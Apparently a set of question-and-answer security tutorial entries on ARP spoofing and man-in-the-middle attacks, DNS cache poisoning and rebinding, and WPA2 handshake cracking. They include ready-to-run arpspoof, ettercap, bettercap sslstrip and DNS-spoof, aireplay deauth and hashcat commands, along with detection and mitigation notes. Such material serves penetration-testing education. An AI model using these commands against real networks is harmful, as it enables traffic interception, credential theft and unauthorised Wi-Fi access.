ARP spoofing exploits ARP's stateless, trust-based design: ARP replies are accepted without verification. Attack: (1) Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward (so traffic flows through attacker). (2) ARP poison: arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP (tell victim attacker is gateway); arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP (tell gateway attacker is victim); run both simultaneously -- traffic flows through attacker. Or use ettercap: ettercap -T -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//. (3) Intercept traffic: Wireshark or tcpdump captures all traffic; SSL traffic appears as TLS -- need SSLstrip or Bettercap for HTTPS. (4) SSLstrip (HSTS bypass for sites without HSTS): bettercap: set http.proxy.sslstrip true; activate http.proxy; sslstrip downgrades HTTPS to HTTP for sites without HSTS preloading -- victim sees HTTP, attacker reads cleartext. (5) DNS spoofing: once MITM, respond to DNS queries with malicious IP: bettercap dns.spoof module; redirect victim to phishing page. (6) Credential capture: use Bettercap net.sniff with protocol filters; or MITMProxy for HTTP/HTTPS proxy-based MITM (requires cert installation). Detection: ARP table inspection (arp -a); static ARP entries; Dynamic ARP Inspection (DAI) on managed switches binds IP/MAC to switch port; 802.1X NAC prevents unauthenticated devices. Encrypted protocols (HTTPS with HSTS, SSH) are resistant to MITM even if ARP is spoofed.
Explain DNS poisoning and cache poisoning attacks.

DNS cache poisoning injects malicious records into a resolver's cache, redirecting victims to attacker-controlled IPs. Kaminsky attack (2008, CVE-2008-1447): (1) DNS resolver caches responses; attacker queries resolver for nonexistent.victim.com repeatedly; (2) Simultaneously floods resolver with forged responses claiming to be the authoritative server for victim.com with NS records pointing to attacker's server; (3) Race condition -- if forged response with correct transaction ID (16-bit: 65536 possibilities) arrives before legitimate response, resolver caches it; (4) All queries for victim.com then resolve to attacker IP. Why it worked: resolvers used predictable source ports (fixed port 53); only 65536 possible transaction IDs; attacker wins race with flooding. Fixes: source port randomisation (adds 16 more bits of entropy); DNSSEC (cryptographic signatures on DNS records -- resolver verifies signature with zone's public key; forged records fail verification). DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) prevent interception and tampering in transit. Practical modern attacks: (1) BGP hijack to become the authoritative DNS server -- national-level attack. (2) DNS rebinding -- attacker controls domain with very short TTL (0s); initially resolves to malicious server (bypasses browser same-origin check since origin = domain); then changes resolution to internal IP (192.168.1.1); victim's browser makes requests to internal network on behalf of attacker domain. (3) Subdomain takeover -- dangling CNAME to unclaimed external service.
How do you exploit wireless networks -- WPA2 cracking and PMKID attacks?

WPA2 cracking methods: (1) 4-way handshake capture: enable monitor mode: airmon-ng start wlan0 -> wlan0mon; scan: airodump-ng wlan0mon; target AP: airodump-ng -c CH --bssid AP_MAC -w capture wlan0mon; deauth connected client to force reauthentication: aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon; capture 4-way handshake (WPA handshake shown in airodump). (2) Crack handshake: hashcat -m 22000 capture.hccapx wordlist.txt; offline dictionary/brute-force attack on PBKDF2-SHA1(SSID, PSK); strong random passwords resist cracking.
